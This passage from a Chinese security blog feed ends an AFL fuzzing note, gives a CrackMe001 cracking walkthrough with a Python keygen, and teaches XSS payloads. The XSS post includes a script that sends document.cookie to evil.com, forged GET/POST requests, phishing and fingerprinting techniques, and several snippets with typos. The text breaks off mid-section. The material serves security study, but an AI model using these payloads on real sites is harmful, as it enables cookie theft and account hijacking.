src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326203348393.png" alt="image-20240326203348393" /></p><p>按照报错信息，输入 <code>echo core &gt;/proc/sys/kernel/core_pattern</code>，提示权限不够的话可以输入以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><blockquote><p>这里是因为重定向操作符 <code>&gt;</code> 在执行前就已经获得了 sudo 权限，但是 <code>echo</code> 命令本身并没有获得 sudo 权限。</p><p>解决方法是使用 <code>tee</code> 命令，因为 <code>tee</code> 命令可以将输入内容写入文件，而且可以使用 sudo 权限执行。</p></blockquote><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326094802123.png" alt="image-20240326094802123" /></p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><ul><li><a src="https://zhuanlan.zhihu.com/p/90037601">从AFL开始FUZZ之旅</a></li><li><a src="https://www.freebuf.com/articles/system/191536.html">AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing</a></li><li><a src="https://blog.csdn.net/zhongzhehua/article/details/117717656">利用AFL进行模糊测试</a></li><li><a src="https://zhuanlan.zhihu.com/p/680730032">模糊测试工具 AFL的原理与实践</a></li><li><a src="https://blog.csdn.net/weixin_51214674/article/details/134646388?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171145366716800182756803%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=171145366716800182756803&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~timeliness~default-3-134646388-null-null.142^v100^pc_search_result_base2&utm_term=afl%20qemu%E5%AE%89%E8%A3%85">模糊测试FUZZ——AFL安装使用</a></li><li><a src="https://paper.seebug.org/842/">AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模糊测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『逆向』CrackMe001 逆向分析</title>
      <link href="/posts/fadc.html"/>
      <url>/posts/fadc.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具安装"><a class="markdownIt-Anchor" href="#工具安装"></a> 工具安装</h1><p><strong>160个CrackMe的打包文件下载地址：</strong><a href="https://www.lanzoub.com/ipwFHha3bbc">https://www.lanzoub.com/ipwFHha3bbcc</a> 密码:52pj</p><p>win10虚拟机：<a src="https://blog.csdn.net/lvlheike/article/details/120398259">VMware中安装win10教程</a></p><p>IDA pro7.2：<a src="https://blog.csdn.net/Henryli1202/article/details/135072651">逆向分析学习小纪——IDA Pro工具的安装与基本使用</a></p><p>ollydby1.0 ：<a src="https://blog.csdn.net/fittec/article/details/126825758">OllyDbg下载与安装</a></p><h1 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析"></a> 程序分析</h1><p>选择CrackMe–001的 <code>Acid burn.exe</code> 进行逆向分析</p><p>首先运行程序，看看程序的功能</p><p>可以看到程序提供了两种登陆方法，分别是：通过序列号和用户名验证，和单独通过序列号验证</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401171549838.png" alt="image-20240401171549838" /></p><p>选择serial登陆模式，随便输入，弹窗显示验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112538216.png" alt="image-20240402112538216" /></p><p>serial+name登陆方式也一样。</p><p>破解的思路如下：</p><p>因为程序后台肯定是由一个正确的序列号的（不管是代码写死的，还是动态生成的，反正在点击验证按钮的时候，这个序列号肯定是生成好的）。这里出现了对话框，说明作者在校验注册码之后发现如果错误了就直接弹窗，所以只要找到弹出对话框的代码处，向上跟踪，就可以找出判断是否正确的地方了，从而进一步破解程序。</p><h1 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h1><h2 id="脱壳"><a class="markdownIt-Anchor" href="#脱壳"></a> 脱壳</h2><p>用Exeinfo PE工具查看该程序，得到信息如下图，可知该程序没有加壳，而且是用Delphi语言编写的。所以并不需要进行脱壳</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401113359966.png" alt="image-20240401113359966" /></p><h2 id="爆破"><a class="markdownIt-Anchor" href="#爆破"></a> 爆破</h2><p>接下来对程序进行爆破，修改代码使得输入任何子串都提示正确或成功；</p><p>首先将程序放到OD中，Debug --&gt; Run运行程序</p><p>选择serial+name登陆模式，随便输入，弹窗显示验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401171710770.png" alt="image-20240401171710770" /></p><p>保持 Try Again 的窗口不要关，然后切换到 OD 界面，按F12暂停程序，进入调试状态。</p><p>点击 Window --&gt; 7 call stack of main thread ，或者直接点击工具栏中的 K 按钮，查看线程堆栈，额可以看到我们选中的这行应该就是弹窗对应的 <code>MessageBoxA函数</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401173244715.png" alt="image-20240401173244715" /></p><p>选中这一行，右键选择show call跳转到对应的汇编代码出</p><p>跳转到的选中行就是反汇编之后，程序中控制弹出提示框的语句。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401173704942.png" alt="image-20240401173704942" /></p><p>所以，序列号验证的逻辑肯定就在这句前面不远处。</p><p>往上翻，我们找到了 push ebp 这句代码，这句代码在汇编语言中，一般在程序入口会出现，在 <code>42A193</code> 这里 F2 打个断点</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401191338213.png" alt="image-20240401191338213" /></p><p>重新运行程序（直接点击运行按钮或鼠标选中后按F9）</p><p>重新点击 <code>Check it baby</code> 按钮，在右下角堆栈处找到定位语句最近的一条<code>Return </code> 语句：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401202513876.png" alt="image-20240401202513876" /></p><p>右键 <code>Follow in Disassm..(反汇编跟随)</code>，这里直接连接了一个跳转，往下面翻，可以看到有这一段<code>JNZ</code>和<code>JMP</code>比较后跳转的两部分代码 Jnz 则进入Good job Dude, 否则就进入JMP Sorry</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401202933245.png" alt="image-20240401202933245" /></p><p>选中JNZ语句，右键选择 <code>Fill with NOPs</code>，通过nops(空指令填充)替换<code>JNZ</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401203349476.png" alt="image-20240401203349476" /></p><p>重新执行程序，仍然是输入 <code>aa</code> ，发现出现了验证失败弹窗，往前翻，发现在执行选择之前有一个审查，如果serial小于4直接验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402000609854.png" alt="image-20240402000609854" /></p><p>所以我们再重新执行，输入 <code>aaaa</code>，可以看到成功绕过</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401212619104.png" alt="image-20240401212619104" /></p><h2 id="分析序号生成算法"><a class="markdownIt-Anchor" href="#分析序号生成算法"></a> 分析序号生成算法</h2><p>从这里的反汇编部分代码，可以看到用户名的计算算法流程， 首先取出用户名的第一位，乘以0x29。然后再乘以2。保留结果。假设结果为16BE，也就是十 进制的5822</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402000725167.png" alt="image-20240402000725167" /></p><p>接着，将计算的结果转为字符串，然后和实现准备好的字符串进行拼接，结果为—— CW-5822-CRACKED 这个就是序 列号，也就是说序列号是根据用户名动态生成的。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402001450319.png" alt="image-20240402001450319" /></p><h2 id="注册机"><a class="markdownIt-Anchor" href="#注册机"></a> 注册机</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 密码</span></span><br><span class="line">    key1 = <span class="string">&quot;CW&quot;</span></span><br><span class="line">    key2 = <span class="string">&quot;CRACKED&quot;</span></span><br><span class="line">    <span class="comment"># 输入用户名</span></span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名 长度必须大于等于4: &quot;</span>)</span><br><span class="line">    <span class="comment"># 判断长度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;长度必须大于等于4,请重新输入\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 根据用户名生成密码</span></span><br><span class="line">    <span class="comment"># 计算用户名的第一位</span></span><br><span class="line">    username1 = <span class="built_in">ord</span>(username[<span class="number">0</span>])</span><br><span class="line">    result1 = (username1 &lt;&lt; <span class="number">0x3</span>) - username1  <span class="comment"># 左移0x3位再减去原来的值</span></span><br><span class="line">    <span class="comment"># 计算用户名第二位</span></span><br><span class="line">    username2 = <span class="built_in">ord</span>(username[<span class="number">1</span>])</span><br><span class="line">    result1 = (username1 &lt;&lt; <span class="number">0x4</span>) + result1  <span class="comment"># 左移4位再加上原来的结果</span></span><br><span class="line">    <span class="comment"># 计算用户名的第四位</span></span><br><span class="line">    username4 = <span class="built_in">ord</span>(username[<span class="number">3</span>])</span><br><span class="line">    result2 = username4 * <span class="number">0xB</span>  <span class="comment"># 乘以0xB</span></span><br><span class="line">    <span class="comment"># 计算用户名的第三位</span></span><br><span class="line">    username3 = <span class="built_in">ord</span>(username[<span class="number">2</span>])</span><br><span class="line">    result2 = (username3 * <span class="number">0xE</span>) + result2  <span class="comment"># 乘以0xE再加上第四位的结果</span></span><br><span class="line">    <span class="comment"># 再次计算第一位</span></span><br><span class="line">    result3 = username1 * <span class="number">0x29</span> * <span class="number">2</span>  <span class="comment"># 乘以0x29再乘以2</span></span><br><span class="line">    <span class="comment"># 将result3转为ASCII 并拼接密钥</span></span><br><span class="line">    key = <span class="string">f&quot;<span class="subst">&#123;key1&#125;</span>-<span class="subst">&#123;result3&#125;</span>-<span class="subst">&#123;key2&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># 打印key</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;密钥为:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行程序，随便输入一个用户名</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112453492.png" alt="image-20240402112453492" /></p><p>程序根据输入的用户名算出了一组序列号，输入到目标程序里，成功进入</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112440883.png" alt="image-20240402112440883" /></p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><p><a src="https://blog.csdn.net/wenxuhonghe/article/details/95638925">CrackMe 实战】逆向破解实战之 001 Acid burn.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』XSS攻击进阶——XSS payload</title>
      <link href="/posts/a4a5.html"/>
      <url>/posts/a4a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-xss-payload"><a class="markdownIt-Anchor" href="#什么是-xss-payload"></a> 什么是 XSS payload</h1><p>当发现网站存在XSS漏洞时，攻击者能够对该网站植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些<strong>用以完成各种具体功能的恶意脚本</strong>，被称为XSS Payload。</p><blockquote><p>XSS Payload实际上就是JavaScript脚本（还可以是 Flash或其他富客户端的脚本)，所以任何JavaScript脚本能实现的功能，XSS Payload都能做到</p></blockquote><h1 id="最常见的xss-payloadcookie劫持"><a class="markdownIt-Anchor" href="#最常见的xss-payloadcookie劫持"></a> 最常见的XSS payload——Cookie劫持</h1><ol><li><p><strong>概念</strong></p><p>最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。</p><blockquote><p>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不通过密码，而直接登录进用户的账户。</p></blockquote></li><li><p><strong>例子</strong></p><p>如下所示，攻击者可以先构造一个含恶意参数的url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>加载一个远程脚本，真正的XSS Payload写在远程脚本 <code>evil.js</code> 中。</p><blockquote><p>这样可以避免直接在URL的参数里写入大量的JavaScript代码。</p></blockquote><p>在 <code>evil.js</code>  中，可以通过如下代码窃取Cookie:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img -<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://www.evil.com/log?&quot;</span> + <span class="built_in">escape</span> (<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>当用户访问这个构造的url时执行脚本，这段代码在页面中插入了一张看不见的图片，同时把 docnment cookie对象作为参数发送到远程服务器。</p><p>这样就实现了cookie 的劫持</p></li></ol><p>在成功实现XSS攻击后，除了cookie劫持之外，攻击者还有很多更强大的 XSS payload来控制用户的浏览器</p><h1 id="构造get和post请求"><a class="markdownIt-Anchor" href="#构造get和post请求"></a> 构造GET和POST请求</h1><ol><li><p><strong>原理</strong></p><p>一个网站的应用，只需要接受HTTP协议中的GET 或 POST请求，即可完成所有操作。对于攻击者来说，仅通过JavaScript，就可以让浏览器发起这两种请求。</p></li><li><p><strong>构造GET请求例子</strong></p><p>假设某博客网站存在XSS漏洞，我们如何通过XSS漏洞来删除掉博客上的某篇文章？</p><p>假设正常删除该文章的链接是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012</span><br></pre></td></tr></table></figure><p>攻击者可以构造一段javascript代码（XSS Payload）如下，</p><p>这段代码中，通过插入一个img标签来发起一个GET请求，从而对删除文章的链接发出了请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>后续，攻击者只需要通过XSS漏洞诱使用户执行这段XSS Payload，就会删除这篇文章</p></li><li><p><strong>构造POST请求例子</strong></p><p>如果网站上只有一个表单，即仅接收POST请求，如何实施XSS攻击？</p><p>可以通过两种方法实现攻击：</p><ul><li><p><strong>1）构造一个form表单，自动提交这个表单</strong></p><ul><li><p>a. 一个个构造DOM节点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span class="string">&quot;form&quot;</span>);</span><br><span class="line">f.<span class="property">action</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">f.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i1 = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span class="string">&quot;input&quot;</span>);</span><br><span class="line">i1.<span class="property">name</span> = <span class="string">&quot;ck&quot;</span>;</span><br><span class="line">i1.<span class="property">value</span> = <span class="string">&quot;JiUY&quot;</span>;</span><br><span class="line">f.<span class="title function_">appendchi1d</span>(i1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input”);</span></span><br><span class="line"><span class="string">i2.name = &quot;</span> mb_text<span class="string">&quot;;</span></span><br><span class="line"><span class="string">i2.value = &quot;</span>testtesttest<span class="string">&quot;;</span></span><br><span class="line"><span class="string">f.appendchild(i2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f.submit();</span></span><br></pre></td></tr></table></figure><blockquote><p>如果表单的参数很多的话，通过构造DOM 节点的方式，代码将会非常冗长。所以可以使用第二种方法，直接写HTML代码，这样会使得整个代码精简很多。</p></blockquote></li><li><p>b. 直接构造HTML代码，如下所示:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dd = doeument.<span class="property">createElement</span> (<span class="string">&quot;div&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendchild</span>(dd);</span><br><span class="line">dd.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot; id=&quot;xssform&quot; name=&quot;mbform&quot;&gt; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type =<span class="string">&quot;hidden&quot;</span> value = <span class="string">&quot;JiUY&quot;</span> name=<span class="string">&quot;ck&quot;</span>/&gt;<span class="string">&#x27; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;testtesttest&quot;</span> name = <span class="string">&quot;mb_text”/&gt;&#x27; + </span></span><br><span class="line"><span class="string">&#x27;&lt;/form&gt;&#x27;</span></span><br><span class="line"><span class="string">document.getElementById(&quot;</span>xssform<span class="string">&quot;).submit();</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>2）通过 XMLHttpRequest 发送一个 POST 请求</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://www.douban.com&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> postStr = <span class="string">&quot;ck=JiUY &amp;mb text-test1234&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> ajax =nul1;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpReguest</span>)&#123;</span><br><span class="line">    ajax =<span class="keyword">new</span> <span class="title class_">XMLRttpRequest</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">Activexobject</span>)&#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> <span class="title class_">ActiveXobjeet</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">ajax.<span class="property">setRequestHeader</span> (<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.<span class="title function_">send</span>(postStr);</span><br><span class="line"></span><br><span class="line">ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (ajax.<span class="property">readystate</span>- <span class="number">4</span>&amp;&amp; ajax.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="xss钓鱼"><a class="markdownIt-Anchor" href="#xss钓鱼"></a> XSS钓鱼</h1><p>XSS并非万能。前面的例子都是Javascript脚本，缺少&quot;与用户的交互&quot;，当出现需要与用户进行交互的情况是，如：碰到验证码、修改密码时需要输入旧密码，XSS Payload就会失效。</p><p>但我们可以通过其他方法来进行攻击：</p><ul><li>验证码：XSS Payload可以读取页面的内容，将验证码的图片URL发送到远程服务器上来实施。攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。</li><li>修改密码：攻击者可以将XSS与&quot;钓鱼&quot;结合。如：利用 Javascript 在当前页面上&quot;画出&quot;一个伪造的登录框，当用户在登录框中输入用户名和密码后，其密码将被发送到黑客的服务器上。</li></ul><h1 id="识别用户浏览器"><a class="markdownIt-Anchor" href="#识别用户浏览器"></a> 识别用户浏览器</h1><p>在很多时候，攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道用户使用的浏览器、操作系统，攻击者就有可能实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。</p><p>如何通过JavaScript脚本识别浏览器版本呢？</p><ol><li><p><strong>通过XSS 读取浏览器的UserAgent对象</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(navigator.<span class="property">userAgent</span>);</span><br></pre></td></tr></table></figure><p>但是userAgent是可以伪造的，同时浏览器的一些拓展也可以屏蔽或自定义UA，这个信息不一定准确。</p></li><li><p><strong>根据浏览器之间的差异识别</strong></p><p>根据每种浏览器独有的对象特征识别浏览器的大版本</p></li></ol><h1 id="识别用户安装的软件"><a class="markdownIt-Anchor" href="#识别用户安装的软件"></a> 识别用户安装的软件</h1><p>知道用户使用的浏览器、操作系统后，可以通过各种方法<strong>识别用户安装了的软件</strong></p><ol><li><p><strong>通过浏览器控件的classid检测相应软件</strong></p><p>可以通过判断软件对应控件的classid是否存在，来判断用户是否安装了该软件</p><p>如下代码检测迅雷的控件 <code>XunLeiBHO.ThunderIEHelper</code> ，如果存在，用户大概率也安装了迅雷软件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">Obj</span> = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;XunLeiBHO.ThunderIEHelper&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">  <span class="comment">//异常了，不存在该控件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本</strong>。</p></li><li><p><strong>通过第三方软件</strong></p><p>如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。在XSS Payload中，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的javascript</p></li><li><p><strong>其他</strong></p><p>在Chrome中有一个特殊的协议: chrome:// ，Chrome的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome://flashgot/skin/icon32.png</span><br></pre></td></tr></table></figure><p>扫描Chrome扩展时，只需在Javascript中加载这张图片，如果加载成功，则扩展存在；反之，扩展就不存在。</p></li></ol><h1 id="css-history-hack"><a class="markdownIt-Anchor" href="#css-history-hack"></a> CSS History Hack</h1><p>通过CSS，来<strong>发现用户曾经访问过的网站</strong></p><p>如果用户曾经访问过某个链接，那么这个链接的颜色会和未访问过的链接颜色不一致。</p><p>对应的POC代码见《白帽子讲web安全》P58</p><p>搜索引擎好像没有这个情况了，但是google scholar仍然存在，访问过的为紫色</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240229200958088.png" alt="image-20240229200958088" /></p><h1 id="获取用户的真实ip地址"><a class="markdownIt-Anchor" href="#获取用户的真实ip地址"></a> 获取用户的真实IP地址</h1><p>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢?</p><p>可以通过XSS Payload获取客户端的本地IP地址。</p><p>**javascript本身并没有获取本地IP地址的能力。**一般需要第三方软件来完成。</p><p>比如，客户端安装了Java环境(JRE)，那么XSS就可以通过调用J ava Applet 的接口获取客户端的本地IP地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AttackAPI</span>.<span class="property">dom</span>.<span class="property">getInternalIP</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> sock = <span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">Socket</span>();</span><br><span class="line">      sock.<span class="title function_">bind</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">0</span>));</span><br><span class="line">      sock.<span class="title function_">connect</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="variable language_">document</span>.<span class="property">domain</span>,(!<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>)?<span class="number">80</span>:<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>));</span><br><span class="line">      <span class="keyword">return</span> sock.<span class="title function_">getLocalAddress</span>().<span class="title function_">getHostAddress</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;127.0.0.1&#x27;</span>;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有两个通过API获取本地网络信息的API见《白帽子讲web安全》P61</p><h1 id="xss蠕虫"><a class="markdownIt-Anchor" href="#xss蠕虫"></a> XSS蠕虫</h1><ol><li><p><strong>定义</strong></p><p>XSS蠕虫是指一种具有自我传播能力的XSS攻击，破坏力和影响力巨大。XSS蠕虫借助 Ajax技术实现对Web应用程序中存在的 XSS 漏洞进行自动化利用传播，它可以将一些用户数据信息发送给Web应用程序然后再将自身代码传递进入Web应用程序，等到被感染用户访问Web应用程序时，蠕虫自身将又开始进行数据发送感染。</p></li><li><p><strong>应用场景与条件</strong></p><p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSSWorm攻击。比如，发送站内信、用户留言等页面，都是xss worm的高发区。</p><blockquote><p>如果一个页面只能由用户个人查看，比如“用户个人资料设置”页面，因为缺乏用户之间互动的功能，所以即使存在XSS，也不能被用于XSS Worm的传播。</p></blockquote></li><li><p><strong>例子</strong></p><ul><li><p><strong>第一个重量级的XSS worm —— Samy 